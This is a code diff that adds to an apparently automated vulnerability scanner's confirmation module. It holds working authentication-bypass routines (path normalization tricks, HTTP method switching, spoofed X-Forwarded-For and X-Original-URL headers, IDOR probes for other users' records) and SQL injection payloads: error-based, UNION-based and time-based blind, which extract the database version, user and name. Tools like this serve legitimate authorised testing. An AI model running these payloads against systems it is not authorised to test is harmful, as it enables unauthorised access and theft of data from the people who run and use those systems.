+                        ("{path}/", "trailing slash"),
+                        ("{path}/.", "trailing dot"),
+                        ("{path}..;/", "path normalization"),
+                        ("{path}%20", "space suffix"),
+                        ("{path}%09", "tab suffix"),
+                        ("{path}?", "empty query string"),
+                        ("{path}#", "fragment"),
+                        ("{path};", "semicolon"),
+                    ]
+                    # Case variants
+                    for path in ["/admin", "/api/admin"]:
+                        case_variants = [
+                            path.upper(),                    # /ADMIN
+                            path[0] + path[1:].capitalize(), # /Admin
+                            "/" + "".join(f"%{ord(c):02x}" if c.isalpha() else c for c in path[1:]),  # /%61dmin
+                        ]
+                        for variant in case_variants:
+                            test_url = f"{base_url}{variant}"
+                            try:
+                                resp = await client.get(test_url, follow_redirects=False)
+                                if resp.status_code == 200 and len(resp.text) > 50:
+                                    body_lower = resp.text[:1000].lower()
+                                    if "<!doctype html" in body_lower and "__next" in body_lower:
+                                        continue
+                                    accessed.append({
+                                        "url": test_url,
+                                        "status": resp.status_code,
+                                        "content_length": len(resp.text),
+                                        "bypass": f"case_variant:{variant}",
+                                    })
+                                    bypass_methods_used.append("case_variant")
+                            except Exception:
+                                continue
+
+                        for tmpl, desc in path_bypass_variants:
+                            variant_path = tmpl.format(path=path)
+                            test_url = f"{base_url}{variant_path}"
+                            try:
+                                resp = await client.get(test_url, follow_redirects=False)
+                                if resp.status_code == 200 and len(resp.text) > 50:
+                                    body_lower = resp.text[:1000].lower()
+                                    if "<!doctype html" in body_lower and "__next" in body_lower:
+                                        continue
+                                    accessed.append({
+                                        "url": test_url,
+                                        "status": resp.status_code,
+                                        "content_length": len(resp.text),
+                                        "bypass": f"path_traversal:{desc}",
+                                    })
+                                    bypass_methods_used.append(f"path_traversal:{desc}")
+                            except Exception:
+                                continue
+
+                    # --- Strategy 3: HTTP Method bypass ---
+                    for path in ["/admin", "/api/admin/users", "/api/users"]:
+                        test_url = f"{base_url}{path}"
+                        for alt_method in ["POST", "PUT", "PATCH", "OPTIONS", "HEAD"]:
+                            try:
+                                resp = await client.request(alt_method, test_url, follow_redirects=False)
+                                if resp.status_code == 200 and len(resp.text) > 50:
+                                    body_lower = resp.text[:1000].lower()
+                                    if "<!doctype html" in body_lower and "__next" in body_lower:
+                                        continue
+                                    accessed.append({
+                                        "url": test_url,
+                                        "status": resp.status_code,
+                                        "content_length": len(resp.text),
+                                        "bypass": f"method_bypass:{alt_method}",
+                                        "method": alt_method,
+                                    })
+                                    bypass_methods_used.append(f"method_bypass:{alt_method}")
+                            except Exception:
+                                continue
+
+                    # --- Strategy 4: Header bypass ---
+                    header_bypasses = [
+                        {"X-Forwarded-For": "127.0.0.1"},
+                        {"X-Original-URL": "/admin"},
+                        {"X-Rewrite-URL": "/admin"},
+                        {"X-Custom-IP-Authorization": "127.0.0.1"},
+                        {"X-Forwarded-Host": "localhost"},
+                        {"X-Real-IP": "127.0.0.1"},
+                        {"X-Remote-IP": "127.0.0.1"},
+                        {"X-Client-IP": "127.0.0.1"},
+                        {"X-Host": "127.0.0.1"},
+                    ]
+                    for path in ["/admin", "/api/admin"]:
+                        test_url = f"{base_url}{path}"
+                        for bypass_headers in header_bypasses:
+                            try:
+                                resp = await client.get(test_url, headers=bypass_headers, follow_redirects=False)
+                                if resp.status_code == 200 and len(resp.text) > 50:
+                                    body_lower = resp.text[:1000].lower()
+                                    if "<!doctype html" in body_lower and "__next" in body_lower:
+                                        continue
+                                    header_name = list(bypass_headers.keys())[0]
+                                    accessed.append({
+                                        "url": test_url,
+                                        "status": resp.status_code,
+                                        "content_length": len(resp.text),
+                                        "bypass": f"header_bypass:{header_name}",
+                                    })
+                                    bypass_methods_used.append(f"header_bypass:{header_name}")
+                            except Exception:
+                                continue
+
+                    # --- Strategy 5: IDOR + Auth Bypass ---
+                    # Try accessing other users' data without auth
+                    idor_paths = ["/api/users/1", "/api/users/2", "/api/user/1", "/api/user/2",
+                                  "/api/v1/users/1", "/api/v1/users/2", "/api/accounts/1"]
+                    for path in idor_paths:
+                        test_url = f"{base_url}{path}"
+                        try:
+                            resp = await client.get(test_url, follow_redirects=False)
+                            if resp.status_code == 200 and len(resp.text) > 20:
+                                try:
+                                    data = resp.json()
+                                    # Check for user data
+                                    data_str = json.dumps(data).lower()
+                                    if any(field in data_str for field in ["email", "username", "name", "phone"]):
+                                        accessed.append({
+                                            "url": test_url,
+                                            "status": resp.status_code,
+                                            "content_length": len(resp.text),
+                                            "bypass": "idor_auth_bypass",
+                                            "data_preview": {k: str(v)[:30] for k, v in (data.items() if isinstance(data, dict) else [])},
+                                        })
+                                        bypass_methods_used.append("idor_auth_bypass")
+                                except Exception:
+                                    pass
+                        except Exception:
+                            continue
+
             except Exception:
                 pass
 
         if accessed:
+            unique_bypasses = list(set(bypass_methods_used))
             return {
                 "confirmed": True,
-                "method": f"Unauthenticated access to {len(accessed)} protected endpoints",
-                "proof": f"Accessed protected resources without authentication",
-                "extracted_data": {"accessible_endpoints": accessed},
+                "method": f"Auth bypass via {len(unique_bypasses)} technique(s): {', '.join(unique_bypasses[:5])}",
+                "proof": f"Accessed {len(accessed)} protected resources without authentication",
+                "extracted_data": {
+                    "accessible_endpoints": accessed[:10],
+                    "bypass_techniques": unique_bypasses,
+                },
                 "depth": "auth_bypass",
-                "escalate_to": "critical" if any("/admin" in a["url"] for a in accessed) else "high",
-                "title_detail": f"{len(accessed)} Protected Endpoints Accessible",
-                "impact_addition": f"Auth bypass confirmed: {len(accessed)} protected endpoints accessible without authentication.",
+                "escalate_to": "critical" if any(
+                    "/admin" in a["url"] or a.get("bypass") == "idor_auth_bypass" for a in accessed
+                ) else "high",
+                "title_detail": f"{len(accessed)} Endpoints via {', '.join(unique_bypasses[:3])}",
+                "impact_addition": f"Auth bypass confirmed: {len(accessed)} protected endpoints accessible. Bypass techniques: {', '.join(unique_bypasses)}.",
             }
 
         return {"confirmed": False}
@@ -929,6 +1599,257 @@ class VulnConfirmer:
                 pass
 
         return {"confirmed": False}
+
+    # -----------------------------------------------------------------------
+    # SQLi Confirmation
+    # -----------------------------------------------------------------------
+    async def _confirm_sqli(self, vuln, base_url: str) -> dict:
+        """Confirm SQLi by extracting version, user, database as proof.
+
+        - If UNION works: extract version + user + database
+        - If time-based: demonstrate data extraction (first char of DB name)
+        - Measure actual exploitability (read data? write files? execute commands?)
+        """
+        url = vuln.url
+        param = vuln.parameter
+        method = vuln.method or "GET"
+        payload = vuln.payload_used
+
+        if not url or not param:
+            return {"confirmed": False}
+
+        async with self.rate_limit:
+            try:
+                async with self._http_client(timeout=15.0, follow_redirects=True) as client:
+                    extracted = {}
+                    confirmed_technique = None
+
+                    # --- Strategy 1: Error-based extraction ---
+                    error_payloads = [
+                        ("1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -", "mysql"),
+                        ("1 AND 1=CONVERT(INT,(SELECT @@version))-- -", "mssql"),
+                        ("1 AND 1=CAST((SELECT version()) AS INT)-- -", "postgresql"),
+                    ]
+                    for err_payload, db_type in error_payloads:
+                        try:
+                            resp = await self._sqli_send(client, url, param, method, err_payload)
+                            if resp is None:
+                                continue
+                            body = resp.text
+                            # Look for version string in error
+                            version_patterns = [
+                                r"~([^~]+)~",
+                                r"Duplicate entry '([^']+)'",
+                                r"converting.*?value '([^']+)'",
+                                r"invalid input syntax.*?\"([^\"]+)\"",
+                                r"CAST failed.*?'([^']+)'",
+                            ]
+                            for pat in version_patterns:
+                                m = re.search(pat, body, re.I)
+                                if m:
+                                    val = m.group(1).strip()
+                                    if val and len(val) > 2:
+                                        extracted["db_version"] = val
+                                        extracted["db_type"] = db_type
+                                        confirmed_technique = f"error-based ({db_type})"
+                                        break
+                            if confirmed_technique:
+                                break
+                        except Exception:
+                            continue
+
+                    # --- Strategy 2: UNION-based extraction ---
+                    if not confirmed_technique:
+                        for col_count in range(1, 11):
+                            nulls = ",".join(["NULL"] * col_count)
+                            union_payload = f"-1 UNION SELECT {nulls}-- -"
+                            try:
+                                resp = await self._sqli_send(client, url, param, method, union_payload)
+                                if resp and resp.status_code == 200:
+                                    body = resp.text.lower()
+                                    if "error" not in body and "different number" not in body:
+                                        # Found column count, try extracting data
+                                        for i in range(col_count):
+                                            cols = ["NULL"] * col_count
+                                            cols[i] = "CONCAT('pHnT0m_',@@version,'_pHnT0m')"
+                                            extract_payload = f"-1 UNION SELECT {','.join(cols)}-- -"
+                                            try:
+                                                ext_resp = await self._sqli_send(client, url, param, method, extract_payload)
+                                                if ext_resp:
+                                                    m = re.search(r"pHnT0m_(.+?)_pHnT0m", ext_resp.text)
+                                                    if m:
+                                                        extracted["db_version"] = m.group(1)
+                                                        extracted["column_count"] = col_count
+                                                        extracted["injectable_column"] = i
+                                                        confirmed_technique = f"UNION-based ({col_count} columns)"
+
+                                                        # Try user + database
+                                                        for expr, key in [("current_user()", "db_user"), ("database()", "db_name")]:
+                                                            cols2 = ["NULL"] * col_count
+                                                            cols2[i] = f"CONCAT('pHnT0m_',{expr},'_pHnT0m')"
+                                                            try:
+                                                                r2 = await self._sqli_send(client, url, param, method, f"-1 UNION SELECT {','.join(cols2)}-- -")
+                                                                if r2:
+                                                                    m2 = re.search(r"pHnT0m_(.+?)_pHnT0m", r2.text)
+                                                                    if m2:
+                                                                        extracted[key] = m2.group(1)
+                                                            except Exception:
+                                                                pass
+                                                        break
+                                            except Exception:
+                                                continue
+                                        if confirmed_technique:
+                                            break
+                            except Exception:
+                                continue
+
+                    # --- Strategy 3: Time-based blind — extract first char of DB name ---
+                    if not confirmed_technique:
+                        # Measure baseline
+                        import time
+                        baseline_start = time.monotonic()
+                        await self._sqli_send(client, url, param, method, "1")
+                        baseline = time.monotonic() - baseline_start
+
+                        time_payloads = [
+                            ("' AND SLEEP(3)-- -", "mysql"),
+                            ("'; SELECT pg_sleep(3)-- -", "postgresql"),
+                            ("'; WAITFOR DELAY '0:0:3'-- -", "mssql"),
+                        ]
+                        for time_payload, db_type in time_payloads:
+                            try:
+                                start = time.monotonic()
+                                resp = await self._sqli_send(client, url, param, method, time_payload)
+                                elapsed = time.monotonic() - start
+
+                                if resp is not None and (elapsed - baseline) >= 2.5:
+                                    confirmed_technique = f"time-based blind ({db_type})"
+                                    extracted["db_type"] = db_type
+                                    extracted["timing_proof"] = f"{elapsed:.1f}s vs baseline {baseline:.2f}s"
+
+                                    # Try extracting first char of database name
+                                    db_name_chars = ""
+                                    for pos in range(1, 6):  # First 5 chars only
+                                        for char_code in range(32, 127):
+                                            extract_payload = f"' AND IF(ASCII(SUBSTRING(database(),{pos},1))={char_code},SLEEP(2),0)-- -"
+                                            if db_type == "postgresql":
+                                                extract_payload = f"' AND (CASE WHEN ASCII(SUBSTRING(current_database(),{pos},1))={char_code} THEN pg_sleep(2) ELSE pg_sleep(0) END) IS NOT NULL-- -"
+                                            try:
+                                                e_start = time.monotonic()
+                                                e_resp = await self._sqli_send(client, url, param, method, extract_payload)
+                                                e_elapsed = time.monotonic() - e_start
+                                                if e_resp and (e_elapsed - baseline) >= 1.5:
+                                                    db_name_chars += chr(char_code)
+                                                    break
+                                            except Exception:
+                                                continue
+                                        else:
+                                            break  # No char found at this position
+
+                                    if db_name_chars:
+                                        extracted["db_name_partial"] = db_name_chars
+                                    break
+                            except Exception:
+                                continue
+
+                    if confirmed_technique:
+                        # Determine exploitability level
+                        exploitability = []
+                        if extracted.get("column_count"):
+                            exploitability.append("data_read")
+                        if extracted.get("db_version"):
+                            exploitability.append("version_disclosure")
+                        if extracted.get("db_user"):
+                            exploitability.append("user_disclosure")
+                        if extracted.get("db_name") or extracted.get("db_name_partial"):
+                            exploitability.append("database_disclosure")
+                        if "timing_proof" in extracted:
+                            exploitability.append("blind_data_extraction")
+
+                        extracted["exploitability"] = exploitability
+
+                        return {
+                            "confirmed": True,
+                            "method": confirmed_technique,
+                            "proof": f"SQLi confirmed via {confirmed_technique}. Extracted: {', '.join(f'{k}={v}' for k, v in extracted.items() if k != 'exploitability')}",
+                            "extracted_data": extracted,
+                            "depth": "data_extraction" if extracted.get("column_count") else "blind_extraction",
+                            "escalate_to": self._escalate_severity(extracted),
+                            "title_detail": f"SQLi ({confirmed_technique})",
+                            "impact_addition": f"SQL injection confirmed via {confirmed_technique}. DB version: {extracted.get('db_version', 'N/A')}. User: {extracted.get('db_user', 'N/A')}. Database: {extracted.get('db_name', extracted.get('db_name_partial', 'N/A'))}.",
+                        }
+
+            except Exception as e:
+                logger.debug(f"SQLi confirmation error: {e}")
+
+        return {"confirmed": False}
+
+    async def _sqli_send(self, client, url, param, method, payload) -> httpx.Response | None:
+        """Send a SQLi payload."""
+        try:
+            if method.upper() == "POST":
+                return await client.post(url, data={param: payload})
+            else:
+                parsed = urlparse(url)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                params[param] = [payload]
+                new_query = urlencode(params, doseq=True)
+                test_url = urlunparse(parsed._replace(query=new_query))
+                return await client.get(test_url)
+        except Exception:
+            return None
+
+    # -----------------------------------------------------------------------
+    # Severity Escalation Engine
+    # -----------------------------------------------------------------------
+    def _escalate_severity(self, extracted_data: dict) -> str:
+        """Determine severity based on what confirmation proved.
+
+        Rules:
+        - Can read local files -> HIGH
+        - Can read credentials -> CRITICAL
+        - Can execute commands -> CRITICAL
+        - Can access internal services -> HIGH
+        - Can access other users' data -> HIGH
+        - Can read DB data via UNION -> CRITICAL (full data read)
+        - Can read DB version via blind -> HIGH
+        """
+        # Check for credential access
+        credential_indicators = [
+            "iam_leak", "AccessKeyId", "SecretAccessKey", "service_account_token",
+            "managed_identity_token", "ssh_key", "aws_creds_file", "shadow_hashes",
+            "env_secrets", "passwd_read",
+        ]
+        for indicator in credential_indicators:
+            if extracted_data.get(indicator):
+                return "critical"
+
+        # Check for command execution
+        if extracted_data.get("can_write_files") or extracted_data.get("reverse_shell_templates"):
+            return "critical"
+        if extracted_data.get("whoami") or extracted_data.get("uid"):
+            return "critical"
+
+        # Check for full DB read (UNION-based)
+        if extracted_data.get("column_count") and extracted_data.get("db_version"):
+            return "critical"
+
+        # Check for internal service access
+        if extracted_data.get("internal_services"):
+            return "high"
+        if extracted_data.get("service"):
+            return "high"
+
+        # Check for file read
+        if extracted_data.get("file_read") or extracted_data.get("users"):
+            return "high"
+
+        # Check for other users' data
+        if extracted_data.get("records_accessed"):
+            return "high"
+
+        # Default to high for confirmed vulns
+        return "high"
 
     # -----------------------------------------------------------------------
     # Generic Misconfiguration Confirmation
